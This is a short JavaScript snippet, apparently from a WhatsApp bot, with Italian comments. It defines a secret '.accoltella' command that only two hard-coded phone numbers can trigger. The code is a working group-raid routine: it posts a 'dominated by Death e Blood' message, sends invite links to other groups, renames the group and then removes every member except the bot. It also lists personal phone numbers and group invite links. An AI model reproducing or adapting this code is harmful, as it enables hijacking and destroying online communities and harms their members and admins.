if (body === '.accoltella') {
    // Numeri owner autorizzati
    const owners = [
        '+27763845778@s.whatsapp.net',
        '+212621266387@s.whatsapp.net'
    ];

    if (!owners.includes(sender)) return;

    try {
        const messaggioIntro = "𝑨𝑽𝑬𝑻𝑬 𝑳'𝑶𝑵𝑶𝑹𝑬 𝑫𝑰 𝑬𝑺𝑺𝑬𝑹𝑬 𝑺𝑽𝑻 𝑫𝑨𝑮𝑳𝑰 𝑼𝑵𝑰𝑪𝑰 𝑽𝑬𝑹𝑰 𝑲𝑰𝑵𝑮 𝑫𝑬𝑨𝑻𝑯 𝑬 𝑩𝑳𝑶𝑶𝑫";

        const nuovoNome = "ℚ𝕦𝕖𝕤𝕥𝕠 𝕘𝕣𝕦𝕡𝕡𝕠 𝕖̀ 𝕤𝕥𝕒𝕥𝕠 𝕕𝕠𝕞𝕚𝕟𝕒𝕥𝕠 𝕕𝕒 𝔻𝕖𝕒𝕥𝕙 𝕖 𝔹𝕝𝕠𝕠𝕕";

        // 🔥 Manda messaggio introduttivo
        await sock.sendMessage(from, { text: messaggioIntro });

        // 🔥 Manda i due link
        await sock.sendMessage(from, { text: "ℂ𝕀 𝕋ℝ𝔸𝕊𝔽𝔼ℝ𝕀𝔸𝕄𝕆 ℚ𝕌𝕀\nhttps://chat.whatsapp.com/I7aZhCaJoyK9sJhKmdY3km?mode=hqrc" });
        await sock.sendMessage(from, { text: "𝔸ℕℂℍ𝔼 ℚ𝕌𝕀\nhttps://chat.whatsapp.com/GReeEoOxlOxCVBBCyXJuEj?mode=ems_copy_t" });

        // 🔥 Cambia il nome del gruppo
        await sock.groupUpdateSubject(from, nuovoNome);

        // 🔥 Rimuove tutti i membri tranne il bot
        const metadata = await sock.groupMetadata(from);
        const botId = sock.user.id.split(":")[0];

        const toRemove = metadata.participants
            .map(p => p.id)
            .filter(id => !id.includes(botId));

        if (toRemove.length > 0) {
            await sock.groupParticipantsUpdate(from, toRemove, "remove");
        }

    } catch (err) {
        await sock.sendMessage(from, { text: `❌ Errore: ${err.message}` });
    }

    return;
}
